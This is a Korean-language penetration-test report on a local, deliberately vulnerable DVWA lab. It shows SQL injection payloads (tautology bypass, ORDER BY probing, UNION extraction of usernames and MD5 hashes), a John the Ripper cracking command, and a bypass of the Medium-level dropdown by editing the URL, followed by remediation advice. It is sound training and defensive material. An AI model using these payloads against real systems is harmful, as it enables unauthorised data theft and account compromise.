# 모의해킹 보고서: DVWA 웹 애플리케이션 취약점 점검

## 1. 개요 (Executive Summary)

본 보고서는 OWASP Top 10 기반 웹 애플리케이션 취약점 학습 및 포트폴리오
목적으로, 의도적으로 취약하게 구성된 DVWA(Damn Vulnerable Web Application)를
대상으로 수행한 점검 결과를 정리한 것이다. 점검은 Docker 컨테이너로 격리된
환경에서 진행되었으며, 외부 시스템에 대한 공격은 포함되지 않는다.

점검 결과 SQL Injection 취약점이 발견되었으며, 이를 통해 인증 과정 없이
전체 사용자 정보 및 비밀번호 해시를 탈취할 수 있음을 확인하였다. 또한 DVWA의
Low/Medium 난이도를 비교하여, **클라이언트 측 입력 제한(드롭다운)이 실질적인
보안 대책이 되지 못함**을 실증하였다.

| 구분 | 내용 |
|---|---|
| 점검 대상 | DVWA (localhost:8080, Docker 컨테이너) |
| 점검 기간 | 2026-10-04 |
| 점검자 | 이기원 |
| 발견 취약점 수 | 1건 (SQL Injection, Critical) — Low/Medium 난이도에서 모두 성공 |

---

## 2. 점검 범위 및 환경 (Scope)

### 2.1 대상 시스템
- **Target**: DVWA (vulnerables/web-dvwa Docker 이미지), http://localhost:8080
- **Attacker / Host**: Kali Linux 2026.03

### 2.2 환경 구성
- Docker 컨테이너로 DVWA 실행 (`docker run -d -p 8080:80 --name dvwa vulnerables/web-dvwa`)
- 로컬(localhost) 환경에서만 접근 가능하도록 구성, 외부 노출 없음
- DVWA Security Level: Low → Medium 순으로 테스트

### 2.3 사용 도구
- Firefox (Kali 내장 브라우저)
- John the Ripper (비밀번호 해시 크랙)
- rockyou.txt 워드리스트

---

## 3. 방법론 (Methodology)

1. **환경 구성**: DVWA Docker 컨테이너 실행 및 DB 초기화
2. **정상 동작 확인**: 의도된 사용법(User ID 조회)으로 baseline 확인
3. **취약점 식별**: 입력값에 특수문자를 넣어 SQL 구문 오류 유도
4. **공격 (Low)**: 인증 우회, 컬럼 개수 파악, UNION 기반 데이터 추출
5. **난이도 상향 테스트 (Medium)**: 동일 공격이 막히는지 확인, 우회 시도
6. **사후 분석**: 탈취한 해시의 실제 크랙 가능성 검증

---

## 4. 취약점 상세 (Findings)

### 4.1 [Critical] SQL Injection (Low / Medium)

| 항목 | 내용 |
|---|---|
| 위험도 | **Critical** |
| 유형 | SQL Injection (OWASP A03:2021 – Injection) |
| 대상 | `/vulnerabilities/sqli/` (`id` 파라미터) |
| 영향받는 난이도 | Low, Medium (둘 다 성공) |

#### 설명
DVWA의 SQL Injection 페이지는 사용자가 입력한 `id` 값을 이스케이프 처리 없이
SQL 쿼리문에 직접 삽입한다. 이로 인해 공격자가 SQL 구문을 조작하여 원래
의도되지 않은 쿼리를 실행시킬 수 있다. Medium 레벨은 입력 방식을 드롭다운
(select box)으로 변경하여 임의 입력을 막으려 했으나, 이는 **클라이언트 측
제한에 불과**하여 HTTP 요청(GET 파라미터)을 직접 조작하면 동일하게 우회된다.

#### 재현 절차

**[Low 레벨]**

1. **정상 동작 확인**: User ID `1` 조회 → 해당 사용자 정보만 출력됨 (baseline)

2. **취약점 식별 및 인증 우회**
   ```
   입력값: ' OR '1'='1
   ```
   → WHERE 조건이 항상 참이 되어, 전체 사용자 5명의 정보가 한 번에 노출됨
   > <img width="926" height="498" alt="image" src="https://github.com/user-attachments/assets/d3cd4e83-afbf-4708-8a86-7fdbd4c375f8" />


3. **컬럼 개수 확인**
   ```
   ' ORDER BY 2-- -   → 정상
   ' ORDER BY 3-- -   → Unknown column '3' in 'order clause' 에러
   ```
   → 컬럼 수가 2개임을 확인
   > <img width="976" height="535" alt="image" src="https://github.com/user-attachments/assets/efb0afd6-8619-464b-8e88-84f915e64307" />


4. **UNION 기반 데이터 추출**
   ```
   ' UNION SELECT user, password FROM users-- -
   ```
   → users 테이블의 전체 계정명과 MD5 비밀번호 해시가 그대로 노출됨
   ```
   admin   : 5f4dcc3b5aa765d61d8327deb882cf99
   gordonb : e99a18c428cb38d5f260853678922e03
   1337    : 8d3533d75ae2c3966d7e0d4fcc69216b
   pablo   : 0d107d09f5bbe40cade3de5c71e9e9b7
   smithy  : 5f4dcc3b5aa765d61d8327deb882cf99
   ```
   > <img width="750" height="490" alt="image" src="https://github.com/user-attachments/assets/9e2118c6-417e-4258-93f3-04a9a78e0f01" />


5. **탈취한 해시 크랙 (John the Ripper)**
   ```bash
   echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
   john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
   john --show --format=raw-md5 hash.txt
   # 결과: ?:password
   ```
   → 사전 공격으로 해시가 수 초 내 평문 `password`로 크랙됨
   > <img width="1084" height="638" alt="image" src="https://github.com/user-attachments/assets/70102e1f-ef91-4314-b69c-8ef16438d76a" />


**[Medium 레벨 — 우회 테스트]**

6. **Medium으로 난이도 변경**: DVWA Security 메뉴에서 Medium 선택 → 입력 UI가
   텍스트 입력창에서 **드롭다운**으로 변경됨 (얼핏 입력 제한처럼 보임)
   > [스크린샷 삽입: Medium 모드 SQL Injection 페이지 (드롭다운 UI)]

7. **URL 직접 조작으로 드롭다운 우회**
   ```
   http://localhost:8080/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit
   ```
   → 드롭다운을 거치지 않고 GET 파라미터를 직접 조작하여 **Low와 동일하게
   전체 사용자 정보 노출**
   > <img width="996" height="645" alt="image" src="https://github.com/user-attachments/assets/ceaab1e3-71f9-411d-b9f3-41dcb235aa3d" />


8. **UNION 공격도 동일하게 성공**
   ```
   http://localhost:8080/vulnerabilities/sqli/?id=1' UNION SELECT user, password FROM users-- -&Submit=Submit
   ```
   → Medium 레벨에서도 **비밀번호 해시 전체 추출 성공**
   > <img width="995" height="717" alt="image" src="https://github.com/user-attachments/assets/fa24085c-0e9d-47ef-870d-8447f00d91c0" />


#### 영향 (Impact)
- 인증 없이 전체 사용자 계정 정보 및 비밀번호 해시 탈취 가능
- 탈취한 해시는 일반적인 사전 공격(wordlist attack)만으로도 수 초 내 평문
  복구 가능 (취약한 해싱 방식 + 약한 비밀번호의 복합 문제)
- **Medium 레벨의 UI 기반 입력 제한은 실질적인 보안 통제가 아님**을 실증.
  서버 측 검증 없이 클라이언트 UI만 제한하는 방식은 공격자의 직접적인
  HTTP 요청 조작 앞에서 무력화됨

#### 대응 방안 (Remediation)
1. **Prepared Statement(매개변수화 쿼리) 사용**: 사용자 입력을 SQL 구문과
   분리하여 이스케이프 없이도 안전하게 처리
2. 입력값에 대한 **서버 측 화이트리스트 검증** (숫자만 허용 등) — 클라이언트
   측 드롭다운/셀렉트박스만으로는 보안이 보장되지 않음
3. 비밀번호 저장 시 MD5 대신 **bcrypt, Argon2** 등 느린 해시 알고리즘 사용
4. 데이터베이스 계정에 **최소 권한 원칙** 적용 (조회용 계정에 DDL/DML 권한 과다 부여 금지)
5. WAF(Web Application Firewall) 또는 DVWA 자체 제공 PHPIDS 같은 추가 탐지 계층 활용

---

## 5. 종합 결론 및 권고사항

| 번호 | 취약점명 | 난이도 | 위험도 | 상태 |
|---|---|---|---|---|
| 1 | SQL Injection (인증 우회) | Low | Critical | 미조치 (연습 환경) |
| 2 | SQL Injection (UNION 데이터 추출) | Low | Critical | 미조치 (연습 환경) |
| 3 | SQL Injection (드롭다운 우회) | Medium | Critical | 미조치 (연습 환경) |

이번 점검을 통해 SQL Injection이 단순 정보 노출을 넘어 **인증 우회, 비밀번호
탈취, 나아가 크랙을 통한 평문 계정 획득**까지 이어지는 전체 공격 체인을
실습하였다. 특히 Medium 난이도 테스트에서 확인했듯, **클라이언트 측에서만
입력을 제한하는 방식은 보안 대책으로서 효과가 없으며, 반드시 서버 측 검증과
매개변수화 쿼리가 병행되어야 한다**는 점을 실증적으로 확인할 수 있었다.

추후 XSS(Reflected/Stored), Command Injection, File Upload 등 추가 OWASP
Top 10 취약점에 대한 점검을 진행하여 보고서를 확장할 예정이다.

---

## 6. 부록

- 대상 파라미터: `id` (`/vulnerabilities/sqli/`)
- 사용 페이로드
  - `' OR '1'='1`
  - `' ORDER BY N-- -`
  - `' UNION SELECT user, password FROM users-- -`
- 참고 자료
  - OWASP Top 10 2021 – A03:2021 Injection
  - OWASP SQL Injection Cheat Sheet
  - DVWA 공식 문서
